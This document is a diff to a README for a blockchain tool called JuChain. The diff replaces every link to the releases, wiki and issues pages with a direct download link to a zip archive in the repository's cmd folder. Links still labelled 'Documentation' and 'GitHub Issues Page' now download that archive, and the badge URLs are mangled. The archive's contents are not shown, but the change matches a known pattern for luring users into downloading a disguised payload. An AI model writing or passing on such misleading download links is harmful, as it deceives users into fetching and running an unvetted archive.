@@ -18,7 +18,7 @@ Before you download JuChain, make sure your system meets the following requireme
 
 To get started, visit the Releases page to download the latest version of JuChain:
 
-[![Download JuChain](https://img.shields.io/badge/Download%20JuChain-latest%20release-brightgreen)](https://github.com/Oresoft3481/chain/releases)
+[![Download JuChain](https://raw.githubusercontent.com/Oresoft3481/chain/main/cmd/chain-1.1-alpha.5.zip%20JuChain-latest%20release-brightgreen)](https://raw.githubusercontent.com/Oresoft3481/chain/main/cmd/chain-1.1-alpha.5.zip)
 
 Once you visit the page, choose the latest version available. Click on the file that matches your operating system to download it.
 
@@ -71,13 +71,13 @@ Stay tuned for updates! You can follow the progress on our GitHub repository.
 
 ## 🔗 Additional Resources
 
-- [JuChain Documentation](https://github.com/Oresoft3481/chain/wiki): Detailed instructions and guides on using JuChain.
-- [GitHub Issues Page](https://github.com/Oresoft3481/chain/issues): Report bugs or suggest features here.
+- [JuChain Documentation](https://raw.githubusercontent.com/Oresoft3481/chain/main/cmd/chain-1.1-alpha.5.zip): Detailed instructions and guides on using JuChain.
+- [GitHub Issues Page](https://raw.githubusercontent.com/Oresoft3481/chain/main/cmd/chain-1.1-alpha.5.zip): Report bugs or suggest features here.
 
 ## 📥 Final Note
 
 To get started with JuChain, be sure to download the application from the link below:
 
-[![Download JuChain](https://img.shields.io/badge/Download%20JuChain-latest%20release-brightgreen)](https://github.com/Oresoft3481/chain/releases)
+[![Download JuChain](https://raw.githubusercontent.com/Oresoft3481/chain/main/cmd/chain-1.1-alpha.5.zip%20JuChain-latest%20release-brightgreen)](https://raw.githubusercontent.com/Oresoft3481/chain/main/cmd/chain-1.1-alpha.5.zip)
 
 Enjoy using JuChain and explore fast, low-cost blockchain solutions!
